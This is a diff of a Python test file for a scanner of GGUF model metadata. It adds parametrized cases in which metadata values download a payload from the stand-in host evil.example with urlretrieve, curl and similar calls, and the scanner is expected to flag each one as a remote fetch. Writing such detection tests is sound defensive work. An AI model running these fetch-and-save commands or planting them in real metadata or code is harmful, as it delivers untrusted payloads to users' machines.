@@ -1167,7 +1167,10 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("callback", 'url = "https://evil.example/payload"; requests.get(url)', "remote_fetch"),
         ("callback", "httpx.get('https://evil.example/payload')", "remote_fetch"),
         ("callback", 'httpx.request("GET", url="https://evil.example/payload")', "remote_fetch"),
+        ("callback", "urllib.request.urlretrieve('https://evil.example/payload', '/tmp/payload')", "remote_fetch"),
+        ("callback", "urlretrieve('https://evil.example/payload', '/tmp/payload')", "remote_fetch"),
         ("callback", "window.fetch('https://evil.example/payload')", "remote_fetch"),
+        ("general.description", "example: curl https://evil.example/payload.sh", "remote_fetch"),
     ],
 )
 def test_gguf_metadata_value_requires_concrete_security_evidence(
